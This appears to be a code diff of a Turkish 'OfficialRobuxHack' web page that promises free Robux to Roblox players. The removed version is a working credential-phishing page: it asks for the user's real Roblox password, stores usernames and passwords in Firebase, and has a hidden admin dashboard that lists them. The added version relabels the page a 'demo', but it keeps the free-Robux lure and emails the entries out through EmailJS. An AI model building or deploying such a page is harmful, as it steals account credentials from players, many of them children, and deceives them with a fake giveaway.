@@ -3,345 +3,350 @@
 <html lang="tr">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>OfficialRobuxHack</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#090d18">
+<title>OfficialRobuxHack | Demo Platform</title>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
+:root{
+ --bg:#090d18;
+ --panel:#111827;
+ --panel2:#172235;
+ --green:#35e69a;
+ --blue:#568cff;
+ --muted:#8996aa;
+ --white:#f5f8ff;
+ --border:rgba(255,255,255,.08);
+}
 *{box-sizing:border-box}
 body{
- margin:0;background:#080d12;color:white;
- font-family:Arial,sans-serif
+ margin:0;
+ min-height:100vh;
+ background:
+ radial-gradient(ellipse at 15% 10%,#143b3540,transparent 38%),
+ radial-gradient(ellipse at 85% 85%,#183b7040,transparent 38%),
+ var(--bg);
+ color:var(--white);
+ font-family:Inter,Arial,sans-serif;
 }
 header{
- padding:22px 7%;display:flex;
- justify-content:space-between;align-items:center;
- border-bottom:1px solid #244333
+ height:76px;
+ border-bottom:1px solid var(--border);
+ display:flex;
+ align-items:center;
+ justify-content:space-between;
+ padding:0 7%;
+ background:#090d18cc;
+ backdrop-filter:blur(15px);
 }
-.logo{font-size:23px;color:#00ff91;font-weight:900}
-.online{color:#00ff91}
-main{max-width:650px;margin:45px auto;padding:15px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:900}
+.logo-icon{
+ width:39px;height:39px;border-radius:12px;
+ display:grid;place-items:center;
+ color:#07150f;background:var(--green);
+ font-size:21px;font-weight:900;
+}
+.logo span{color:var(--green)}
+.status{
+ font-size:12px;color:var(--green);
+ border:1px solid #35e69a55;
+ padding:8px 13px;border-radius:30px;
+}
+main{
+ width:min(1100px,92%);
+ margin:55px auto;
+ display:grid;
+ grid-template-columns:1fr 1fr;
+ gap:55px;
+ align-items:center;
+}
+.eyebrow{
+ color:var(--green);font-size:12px;
+ letter-spacing:2px;font-weight:800;
+}
+h1{
+ font-size:clamp(38px,5vw,62px);
+ line-height:1.06;letter-spacing:-3px;
+ margin:20px 0;
+}
+h1 span{color:var(--green)}
+.description{
+ color:var(--muted);line-height:1.8;
+ max-width:450px;font-size:15px;
+}
+.features{display:grid;gap:15px;margin-top:32px}
+.feature{display:flex;align-items:center;gap:12px;color:#cbd5e1;font-size:13px}
+.feature-icon{
+ width:32px;height:32px;display:grid;place-items:center;
+ border:1px solid var(--border);border-radius:10px;
+ background:#ffffff08;
+}
 .card{
- background:#121c24;border:1px solid #24503c;
- border-radius:18px;padding:28px;margin-bottom:20px
+ background:linear-gradient(145deg,#182438,#101827);
+ border:1px solid var(--border);
+ border-radius:23px;padding:30px;
+ box-shadow:0 25px 90px #0006;
 }
-h1{text-align:center}
-label{display:block;margin:18px 0 8px;color:#b7c8c0}
+.card h2{font-size:23px;margin:0 0 8px}
+.card-sub{font-size:13px;color:var(--muted);margin-bottom:25px}
+label{
+ display:block;font-size:12px;font-weight:700;
+ color:#d5deec;margin:18px 0 9px;
+}
 input{
- width:100%;padding:15px;background:#080f16;
- border:1px solid #354b42;border-radius:9px;
- color:white;font-size:16px
+ width:100%;height:51px;padding:0 15px;
+ color:white;background:#0b1220;
+ border:1px solid #ffffff18;border-radius:11px;
+ outline:none;font-size:14px;transition:.2s;
 }
-button{
- padding:14px;border:0;border-radius:9px;
- background:#00e987;color:#002414;
- font-weight:bold;cursor:pointer
+input:focus{border-color:var(--green);box-shadow:0 0 0 3px #35e69a18}
+input::placeholder{color:#66748a}
+.amount-buttons{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+.amount-buttons button{
+ flex:1;min-width:65px;padding:9px 5px;
+ border:1px solid var(--border);border-radius:8px;
+ background:#ffffff08;color:#dbe5f3;cursor:pointer;
+ font-size:12px;
 }
-button:hover{filter:brightness(1.1)}
-.primary{width:100%;margin-top:20px}
-.small{background:#253a32;color:white;margin:4px}
-.notice{font-size:12px;color:#a1b4aa;line-height:1.7;margin-top:18px}
-.hidden{display:none!important}
-.stat{display:flex;gap:12px;flex-wrap:wrap}
-.stat div{
- flex:1;min-width:120px;background:#0a1319;
- padding:18px;border-radius:12px
+.amount-buttons button:hover{border-color:var(--green);color:var(--green)}
+.note{
+ background:#35e69a0c;border:1px solid #35e69a30;
+ padding:12px;border-radius:10px;
+ color:#a9cbbb;font-size:11px;line-height:1.6;margin-top:17px;
 }
-.stat strong{display:block;color:#00ff91;font-size:28px}
-.entry{
- background:#0a1319;padding:15px;
- border-radius:10px;margin-top:10px;overflow-wrap:anywhere
+.primary{
+ width:100%;height:54px;margin-top:22px;
+ background:linear-gradient(100deg,#35e69a,#16bd80);
+ color:#06140d;border:0;border-radius:11px;
+ font-size:14px;font-weight:900;cursor:pointer;
+ transition:.2s;
 }
-.entry p{color:#b9c8c0}
-#progressBar{
- height:9px;width:0%;background:#00ff91;
- border-radius:20px;transition:width .1s
+.primary:hover{transform:translateY(-2px);filter:brightness(1.08)}
+.primary:disabled{opacity:.5;cursor:wait;transform:none}
+.small{font-size:11px;color:var(--muted);text-align:center;margin-top:15px}
+.screen{display:none;text-align:center;padding:25px 0}
+.screen.active{display:block}
+.spinner{
+ width:65px;height:65px;margin:15px auto 25px;
+ border:4px solid #ffffff18;border-top-color:var(--green);
+ border-radius:50%;animation:spin .8s linear infinite;
 }
-.error{color:#ff7272;text-align:center}
+@keyframes spin{to{transform:rotate(360deg)}}
+.progress{
+ height:8px;background:#ffffff13;border-radius:20px;
+ overflow:hidden;margin:25px 0 12px;
+}
+.bar{height:100%;width:0;background:var(--green);transition:width .2s}
+.percent{color:var(--green);font-size:25px;font-weight:900}
+.success-icon{
+ width:70px;height:70px;border-radius:50%;
+ display:grid;place-items:center;margin:10px auto 20px;
+ background:#35e69a20;color:var(--green);font-size:35px;
+}
+footer{
+ border-top:1px solid var(--border);
+ padding:25px 7%;text-align:center;
+ color:#65738a;font-size:11px;line-height:1.8;
+}
+@media(max-width:800px){
+ main{grid-template-columns:1fr;gap:35px;margin:35px auto}
+ header{padding:0 5%}
+ .card{padding:23px}
+ h1{letter-spacing:-2px}
+}
 </style>
 </head>
-
 <body>
 
 <header>
- <div class="logo">OfficialRobuxHack</div>
- <div class="online">● ONLINE</div>
+ <div class="logo">
+  <div class="logo-icon">R</div>
+  <div>Official<span>RobuxHack</span></div>
+ </div>
+ <div class="status">● DEMO PLATFORM</div>
 </header>
 
 <main>
-
-<section id="userScreen" class="card">
- <h1>ROBUX HİLESİ</h1>
- <p style="text-align:center;color:#9aaba3">
- Robuxuna ulaş!!!
+<section>
+ <div class="eyebrow">NEXT GENERATION DEMO EXPERIENCE</div>
+ <h1>Yeni nesil<br><span>Robux deneyimi.</span></h1>
+ <p class="description">
+  Kendi demo miktarını belirle, eğlencelik kodunu yaz
+  ve animasyonlu demo deneyimini başlat.
  </p>
-
- <label>Roblox Kullanıcı Adın</label>
- <input id="username" maxlength="30" placeholder="Kullanıcı adın">
-
- <label>Demo Robux miktarı</label>
- <input id="amount" inputmode="numeric"
- placeholder="Örneğin 650000000000">
-
- <div>
-  <button class="small" onclick="setAmount('100')">100</button>
-  <button class="small" onclick="setAmount('1000')">1.000</button>
-  <button class="small" onclick="setAmount('1000000')">1M</button>
-  <button class="small" onclick="setAmount('1000000000')">1B</button>
- </div>
-
- <label>Roblox Şifren</label>
- <input id="demoCode" maxlength="40"
- placeholder="Örn: Robux123>
-
-
-  
-
-  
- <p class="notice">
- Bu alan gerçek Roblox şifresidir.Yazdıktan 2-3 gün sonra hesabınıza gelecektir.
-
- </p>
-
- <button class="primary" onclick="join()">Robux İçin Tıkla →</button>
-
- <p class="notice">
- Bu site robux aktarmaktadır.
- </p>
- <p id="error" class="error"></p>
-</section>
-
-<section id="loading" class="card hidden">
- <h1>HAZIRLANIYOR</h1>
- <div style="text-align:center;font-size:55px">💎</div>
- <p id="progressText" style="text-align:center">0%</p>
- <div style="height:9px;background:#26372e;border-radius:20px;overflow:hidden">
-  <div id="progressBar"></div>
+ <div class="features">
+  <div class="feature"><div class="feature-icon">⚡</div> Hızlı ve animasyonlu demo deneyimi</div>
+  <div class="feature"><div class="feature-icon">🎮</div> Kişiselleştirilebilir demo miktarı</div>
+  <div class="feature"><div class="feature-icon">🔔</div> E-posta bildirimi</div>
+  <div class="feature"><div class="feature-icon">🛡️</div> Gerçek Roblox parolası istenmez</div>
  </div>
 </section>
 
-<section id="result" class="card hidden">
- <h1 style="color:#00ff91">✓ TAMAMLANDI</h1>
- <h2 style="text-align:center">ROBUXUN HAZIR!</h2>
- <div id="resultText" style="text-align:center;color:#00ff91;font-size:24px"></div>
- <p class="notice">
- Bu işlemi gerçekleştirdikten sonra 2-3 gün içerisinde robux gelir. Gerçek Robux hesabına henüz gelmemiştir.
- </p>
- <button class="primary" onclick="location.reload()">YENİDEN DENE</button>
-</section>
+<section class="card">
+ <div id="formScreen">
+  <h2>Demo oluştur</h2>
+  <div class="card-sub">Bilgilerini girerek demo işlemini başlat.</div>
 
-<section id="adminScreen" class="hidden">
- <div class="card">
-  <h1>YÖNETİCİ PANELİ</h1>
-  <label>Yönetici e-postası</label>
-  <input id="adminEmail" type="email" placeholder="E-posta">
-  <label>Yönetici şifresi</label>
-  <input id="adminPassword" type="password" placeholder="Yönetici şifresi">
-  <button class="primary" onclick="adminLogin()">GİRİŞ YAP</button>
-  <p id="adminError" class="error"></p>
+  <form id="demoForm">
+   <label>ROBLOX KULLANICI ADI</label>
+   <input id="username" name="username" placeholder="Kullanıcı adın" required minlength="3" maxlength="30" pattern="[A-Za-z0-9_]+">
+
+   <label>DEMO ROBUX MİKTARI</label>
+   <input id="amount" name="amount" placeholder="Örn. 1000000" required inputmode="numeric" pattern="[0-9]{1,30}">
+   <div class="amount-buttons">
+    <button type="button" data-amount="1000">1K</button>
+    <button type="button" data-amount="10000">10K</button>
+    <button type="button" data-amount="1000000">1M</button>
+    <button type="button" data-amount="1000000000">1B</button>
+   </div>
+
+   <label>KOMİK DEMO KODU</label>
+   <input id="funnyCode" name="funny_code" placeholder="Örn. PatatesKrali123" required minlength="3" maxlength="40">
+
+   <div class="note">
+    Bu alan yalnızca eğlencelik demo kodudur. Roblox şifreni
+    kesinlikle yazma. Bu platform gerçek Robux göndermez.
+   </div>
+
+   <button class="primary" id="submitButton" type="submit">DEMOYU BAŞLAT →</button>
+  </form>
+  <div class="small">OfficialRobuxHack · Demo Experience</div>
  </div>
 
- <div id="dashboard" class="card hidden">
-  <h1>CANLI İSTATİSTİKLER</h1>
-  <div class="stat">
-   <div><strong id="total">0</strong>Katılımcı</div>
-   <div><strong id="completed">0</strong>Oldu!</div>
-  </div>
-  <h3>Katılımcılar</h3>
-  <div id="entries"></div>
-  <button class="primary" onclick="logout()">ÇIKIŞ YAP</button>
+ <div class="screen" id="loadingScreen">
+  <div class="spinner"></div>
+  <h2>Demo hazırlanıyor</h2>
+  <p class="card-sub" id="loadingText">Bilgiler kontrol ediliyor...</p>
+  <div class="progress"><div class="bar" id="bar"></div></div>
+  <div class="percent" id="percent">0%</div>
+  <div class="small">Lütfen bu sayfayı kapatma.</div>
+ </div>
+
+ <div class="screen" id="successScreen">
+  <div class="success-icon">✓</div>
+  <h2>Demo tamamlandı!</h2>
+  <p class="card-sub">Demo katılımın başarıyla işlendi.</p>
+  <div class="note">Bu yalnızca bir demo işlemidir. Gerçek Robux aktarımı yapılmamıştır.</div>
+  <button class="primary" onclick="location.reload()">YENİDEN BAŞLAT</button>
+ </div>
+
+ <div class="screen" id="errorScreen">
+  <div class="success-icon">!</div>
+  <h2>Gönderilemedi</h2>
+  <p class="card-sub" id="errorText">E-posta ayarlarını kontrol et.</p>
+  <button class="primary" onclick="location.reload()">GERİ DÖN</button>
  </div>
 </section>
-
 </main>
 
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<footer>
+ OfficialRobuxHack bir eğlence amaçlı demo platformudur.<br>
+ Roblox ile bağlantılı değildir. Gerçek Robux dağıtımı veya aktarımı yapmaz.
+</footer>
 
 <script>
+// EMAILJS AYARLARI
+const SERVICE_ID = "SERVICE_ID_BURAYA";
+const TEMPLATE_ID = "TEMPLATE_ID_BURAYA";
+const PUBLIC_KEY = "PUBLIC_KEY_BURAYA";
 
-// FIREBASE AYARLARINI BURAYA YAZ
-const firebaseConfig = {
- apiKey:"BURAYA_API_KEY",
- authDomain:"BURAYA_AUTH_DOMAIN",
- databaseURL:"https://robuxhilesi-27fc2-default-rtdb.firebaseio.com/
-",
- projectId:"BURAYA_PROJECT_ID",
- appId:"BURAYA_APP_ID"
-};
+// EmailJS hesabın hazır olduğunda bu ayarları doldur.
+const emailReady =
+ ![SERVICE_ID,TEMPLATE_ID,PUBLIC_KEY].some(v=>v.includes("_BURAYA"));
 
-// KENDİ YÖNETİCİ E-POSTANI YAZ
-const ADMIN_EMAIL="noyanbabapiro@gmail.com";
-
-firebase.initializeApp(firebaseConfig);
-
-const auth=firebase.auth();
-const db=firebase.database();
-
-function setAmount(n){
- document.getElementById("amount").value=n;
+if(emailReady){
+ emailjs.init({publicKey:PUBLIC_KEY});
 }
 
-function formatAmount(value){
- return BigInt(value).toLocaleString("tr-TR");
+document.querySelectorAll("[data-amount]").forEach(button=>{
+ button.addEventListener("click",()=>{
+  document.getElementById("amount").value=button.dataset.amount;
+ });
+});
+
+const form=document.getElementById("demoForm");
+const submitButton=document.getElementById("submitButton");
+
+function showScreen(id){
+ document.querySelectorAll(".screen,#formScreen").forEach(el=>{
+  el.classList.remove("active");
+  if(el.id==="formScreen") el.style.display="none";
+ });
+ const screen=document.getElementById(id);
+ screen.classList.add("active");
 }
 
-async function join(){
+form.addEventListener("submit",async event=>{
+ event.preventDefault();
 
  const username=document.getElementById("username").value.trim();
  const amount=document.getElementById("amount").value.trim();
- const demoCode=document.getElementById("demoCode").value.trim();
- const error=document.getElementById("error");
+ const funnyCode=document.getElementById("funnyCode").value.trim();
 
- error.textContent="";
-
- if(!username || !/^[a-zA-Z0-9_]{3,30}$/.test(username)){
-  error.textContent="Geçerli bir Roblox kullanıcı adı yaz.";
+ if(!/^[A-Za-z0-9_]{3,30}$/.test(username)){
+  alert("Geçerli bir kullanıcı adı gir.");
   return;
  }
 
- if(!/^\d{1,30}$/.test(amount) || BigInt(amount)<1n){
-  error.textContent="İstediğin Robux Miktarını yaz.";
+ if(!/^[0-9]{1,30}$/.test(amount)||BigInt(amount)<1n){
+  alert("Geçerli bir demo miktarı gir.");
   return;
  }
 
- if(!demoCode || demoCode.length<3){
-  error.textContent="Roblox Şifreni Yaz!";
+ if(funnyCode.length<3||funnyCode.length>40){
+  alert("Komik demo kodun 3-40 karakter olmalı.");
   return;
  }
 
- try{
-
-  const user=auth.currentUser ||
-   (await auth.signInAnonymously()).user;
-
-  const ref=db.ref("entries").push();
-
-  await ref.set({
-   uid:user.uid,
-   username:username,
-   amount:amount,
-   demoCode:demoCode,
-   createdAt:firebase.database.ServerValue.TIMESTAMP
-  });
-
-  document.getElementById("userScreen").classList.add("hidden");
-  document.getElementById("loading").classList.remove("hidden");
-
-  let p=0;
-
-  const timer=setInterval(async()=>{
-   p++;
-   document.getElementById("progressBar").style.width=p+"%";
-   document.getElementById("progressText").textContent=p+"%";
-
-   if(p>=100){
-    clearInterval(timer);
-
-    try{
-     await db.ref("completion/"+ref.key).set({
-      uid:user.uid,
-      completed:true
-     });
-    }catch(e){
-     console.error(e);
-    }
-
-    document.getElementById("loading").classList.add("hidden");
-    document.getElementById("result").classList.remove("hidden");
-
-    document.getElementById("resultText").textContent=
-     username+" · "+formatAmount(amount)+" R$";
-   }
-  },120);
-
- }catch(e){
-  error.textContent="Bağlantı hatası: "+e.message;
- }
-}
-
-function showAdmin(){
- document.getElementById("userScreen").classList.add("hidden");
- document.getElementById("adminScreen").classList.remove("hidden");
-}
-
-async function adminLogin(){
-
- const email=document.getElementById("adminEmail").value.trim();
- const password=document.getElementById("adminPassword").value;
-
- if(email.toLowerCase()!==ADMIN_EMAIL.toLowerCase()){
-  document.getElementById("adminError").textContent=
-   "Yetkisiz yönetici hesabı!";
+ if(!emailReady){
+  alert("E-posta sistemi henüz ayarlanmadı. EmailJS bilgilerini eklemelisin.");
   return;
  }
 
- try{
-  await auth.signInWithEmailAndPassword(email,password);
-  document.getElementById("dashboard").classList.remove("hidden");
-  listenEntries();
- }catch(e){
-  document.getElementById("adminError").textContent=
-   "Giriş başarısız: "+e.message;
- }
-}
+ submitButton.disabled=true;
+ showScreen("loadingScreen");
 
-function listenEntries(){
+ const start=Date.now();
+ const duration=12000;
+ const messages=[
+  "Demo bilgileri kontrol ediliyor...",
+  "Demo deneyimi hazırlanıyor...",
+  "E-posta bildirimi gönderiliyor...",
+  "Son kontroller yapılıyor..."
+ ];
 
- db.ref("entries").on("value",async snapshot=>{
-
-  const data=snapshot.val()||{};
-  const list=Object.entries(data).reverse();
-
-  const completionSnapshot=await db.ref("completion").once("value");
-  const completion=completionSnapshot.val()||{};
-
-  document.getElementById("total").textContent=list.length;
-
-  document.getElementById("completed").textContent=
-   list.filter(([id])=>completion[id]?.completed===true).length;
-
-  const container=document.getElementById("entries");
-  container.innerHTML="";
-
-  list.forEach(([id,x])=>{
-
-   const div=document.createElement("div");
-   div.className="entry";
-
-   const title=document.createElement("strong");
-   title.textContent=x.username;
-
-   const details=document.createElement("p");
-   details.textContent=
-    formatAmount(x.amount)+" Robux · "+
-    (completion[id]?.completed?"Demo tamamlandı":"Bekliyor");
-
-   const code=document.createElement("p");
-   code.textContent="Komik demo kodu: "+x.demoCode;
-
-   const copy=document.createElement("button");
-   copy.textContent="Kullanıcı adını kopyala";
-   copy.onclick=()=>navigator.clipboard.writeText(x.username);
-
-   div.append(title,details,code,copy);
-   container.appendChild(div);
-  });
-
+ let emailPromise=emailjs.send(SERVICE_ID,TEMPLATE_ID,{
+  username:username,
+  amount:amount,
+  funny_code:funnyCode,
+  submitted_at:new Date().toLocaleString("tr-TR")
  });
-}
 
-async function logout(){
- db.ref("entries").off();
- db.ref("completion").off();
- await auth.signOut();
- location.reload();
-}
+ const interval=setInterval(()=>{
+  const progress=Math.min(100,Math.floor((Date.now()-start)/duration*100));
+  document.getElementById("bar").style.width=progress+"%";
+  document.getElementById("percent").textContent=progress+"%";
+  document.getElementById("loadingText").textContent=messages[Math.min(3,Math.floor(progress/25))];
+ },100);
 
-if(location.hash==="#admin"){
- showAdmin();
-}
-
+ try{
+  await Promise.all([
+   emailPromise,
+   new Promise(resolve=>setTimeout(resolve,duration))
+  ]);
+  clearInterval(interval);
+  document.getElementById("bar").style.width="100%";
+  document.getElementById("percent").textContent="100%";
+  showScreen("successScreen");
+ }catch(error){
+  clearInterval(interval);
+  console.error(error);
+  document.getElementById("errorText").textContent=
+   "E-posta gönderilemedi. EmailJS Service ID, Template ID ve Public Key bilgilerini kontrol et.";
+  showScreen("errorScreen");
+ }
+});
 </script>
 </body>
 </html>
